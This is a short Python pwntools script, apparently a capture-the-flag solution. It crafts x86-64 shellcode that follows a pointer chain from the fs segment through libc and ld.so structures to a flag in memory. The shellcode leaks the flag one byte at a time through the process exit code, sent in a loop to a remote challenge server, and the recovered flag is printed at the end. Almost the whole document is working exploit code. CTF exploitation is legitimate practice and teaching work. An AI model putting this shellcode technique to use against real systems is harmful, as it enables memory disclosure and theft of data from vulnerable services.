from pwn import *

# 1) at fs:0:  libc/.got + 0x77e0
# 2) at libc/.got + 0x90: address of _rtld_global
# 3) ld.so/.bss = _rtld_global + 0xfa0
# 4) at ld.so/.bss + 0x50: address of .interp in z2h
# 5) z2h/.bss = z2h/.interp + 0x3d48
# 6) flag = z2h/.bss + 0x20


def getFlagChar(offset):
  payloadASM = f"""
    endbr64
    mov rax, [fs:0]
    mov rbx, [rax - 0x77e0 + 0x90]
    mov rcx, [rbx + 0xfa0 + 0x50]
    mov rdi, [rcx + 0x3d48 + 0x20 + {offset}]
    mov eax, 0x3c
    syscall
  """

  payload = asm(payloadASM, arch = "x86_64").hex()

  r = remote("gold.b01le.rs", 4005)
  r.sendline(payload.encode())
  r.recvuntil(b"value: ")
  ans = int( r.recvuntil(b"\n") )
  r.close()

  return ans


flag = b""
for i in range(100):
  c = getFlagChar(i)  
  flag += bytes([c])
  print(flag)
  if flag[-1:] == b"}":  break



#b'bctf{x86_64_r3g1sTer_bL0at_sAVe5_7he_d4y:D_%#$*}'
